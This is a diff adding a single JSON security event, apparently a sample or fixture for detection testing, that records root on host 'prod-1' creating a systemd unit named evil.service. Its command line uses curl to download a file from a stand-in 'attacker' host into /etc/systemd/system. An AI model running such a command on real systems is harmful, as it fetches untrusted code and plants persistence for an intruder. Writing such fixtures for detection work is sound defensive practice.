@@ -1,0 +1,7 @@
+{
+  "event": {"category": "file", "type": "change", "action": "created"},
+  "file": {"path": "/etc/systemd/system/evil.service", "name": "evil.service"},
+  "process": {"name": "bash", "command_line": "bash -c 'curl http://attacker/x > /etc/systemd/system/evil.service'", "parent": {"name": "sshd"}},
+  "user": {"name": "root"},
+  "host": {"name": "prod-1"}
+}
